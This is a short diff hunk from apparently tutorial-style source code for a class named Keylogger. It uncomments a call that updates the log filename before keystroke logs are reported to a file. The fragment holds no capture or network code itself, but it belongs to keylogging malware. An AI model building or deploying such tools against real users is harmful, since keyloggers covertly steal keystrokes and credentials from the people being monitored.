@@ -65,7 +65,7 @@ class Keylogger:
             # if there is something in log, report it
             self.end_dt = datetime.now()
             # update `self.filename`
-            # self.update_filename()
+            self.update_filename()
             if self.report_method == "file":
                 self.report_to_file()
                 # if you don't want to print in the console, comment below line
